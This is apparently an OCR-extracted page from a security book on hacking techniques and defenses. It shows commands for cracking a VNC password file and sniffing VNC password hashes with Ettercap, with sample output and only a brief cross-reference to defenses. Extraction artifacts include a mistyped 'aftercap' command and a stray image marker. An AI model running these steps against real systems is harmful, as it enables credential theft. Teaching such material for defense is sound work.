# Part I: Hacking Techniques and Defenses

$Revision: 1.17 $

```
>>>>>>>>>>>>
Password: test123
```

Additionally, it is possible to brute-force a VNC user's ~/.vnc/passwd file that contains a VNC password hash:

```
[bash]$ vncrack -C ~/.vnc/passwd
VNC password: test123
```

![](bbox=[0.085, 0.297, 0.127, 0.337])

# Prevent VNC Brute-Forcing

Please see “Common Defenses Against Brute-Force Attacks."

Sniffing It is possible to sniff VNC password hashes being transmitted over a network. Once a password hash has been obtained, it must be brute-force cracked in order to reveal the real password.

# Sniff and Crack VNC Passwords

Use Ettercap to obtain the server challenge and client response hashes:

```
[bash]# aftercap -C m -N
```

ettercap 0.6.9 (c) 2002 ALOR & NaGA

Your IP: 192.168.1.1 with MAC: 00:30:23:C1:00:00 on Iface: eth0

Loading plugins... Done.
Building host list for netmask 255.255.255.0, please wait...

Resolving l hostnames...

```
* |=======================================================| 100.00 %
```

Press 'h' for help...
Sniffing (MAC based): ANY ---> ANY
TCP + UDP packets... (default)
Collecting passwords...

```
10:04:28 192.168.1.1:6612 --> 10.0.0.1:5901 VNC
```